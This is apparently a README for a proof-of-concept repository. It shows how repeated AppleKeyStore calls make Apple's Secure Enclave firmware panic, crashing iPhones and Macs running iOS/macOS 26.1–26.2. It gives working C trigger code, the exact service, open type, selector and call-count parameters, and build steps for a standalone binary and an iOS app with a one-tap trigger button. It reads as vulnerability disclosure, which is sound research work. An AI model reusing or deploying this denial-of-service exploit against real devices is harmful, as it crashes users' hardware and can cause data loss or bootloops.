# SEP Exhaustion Kernel Panic

**Author:** [zeroxjf](https://x.com/zeroxjf)

## Warning

This code triggers a kernel panic and **will crash your device**. Use at your own risk. The author is not responsible for any data loss, bootloops, or damage to your device.

## Summary

AppleKeyStore selector 2 with open type `0x2022` triggers a deterministic SEP firmware panic after ~41 consecutive calls. The SEP's SKS (SEPKeyStore) task crashes at address `0x0006fea7`.

## Panic Signature

```
panic(cpu X caller 0x...): SEP Panic: :sks /sks : 0x0006fea7 0x00058fe8 0x00058fc8 0x000492c8 0x00049094 ...
```

## Trigger

```c
io_connect_t conn;
IOServiceOpen(service, mach_task_self(), 0x2022, &conn);

for (int i = 0; i < 50; i++) {
    uint64_t scalars[6] = {1, 0, 0, 0x10, 0, 0};
    uint64_t out[1];
    uint32_t outCnt = 1;

    IOConnectCallMethod(conn, 2, scalars, 6, NULL, 0, out, &outCnt, NULL, NULL);
    usleep(1000);
}
```

| Parameter | Value |
|-----------|-------|
| Service | `AppleKeyStore` |
| Open type | `0x2022` |
| Selector | `2` |
| Scalars | `{1, 0, 0, 0x10, 0, 0}` |
| Delay | 1ms between calls |
| Threshold | ~41 calls |

## SEP State at Crash

```
sks /sks  0x4cb90/0x4c8b8/0x1314131413141314 ert/BOOT   <-- crashed
sks /sksa 0x4cb90/0x4d07c/0x0000001314111213 er/sksa
```

The `0x1314...` pattern appears only in SKS tasks at crash time.

## Observations

- Crash address `0x0006fea7` is 100% consistent (no ASLR in SEP)
- Backtrace identical across all panics (deterministic code path)
- Threshold ~41 suggests counter overflow or resource pool exhaustion
- Connection close/reopen resets state
- Input values don't affect trigger (only call count matters)

## Tested

- iOS 26.1 - 26.2
- macOS 26.1 - 26.2
- iPhone 11 Pro Max
- iPhone 17 Pro Max
- MacBook Pro (M2 Max)
- MacBook Pro (M4 Max)
- MacBook Air (M1 2020)

## Building

### macOS

```bash
clang -framework IOKit -framework CoreFoundation sep_panic_poc.c -o sep_panic
./sep_panic
```

### iOS

1. Open `SEPTest/SEPTest.xcodeproj` in Xcode
2. Select your iOS device
3. Build and run
4. Tap **TRIGGER SEP PANIC** button

## Files

- `sep_panic_poc.c` - Standalone C PoC
- `SEPTest/` - iOS app PoC
- `panic-full-2026-01-13-140458.0002.ips` - Sample panic log
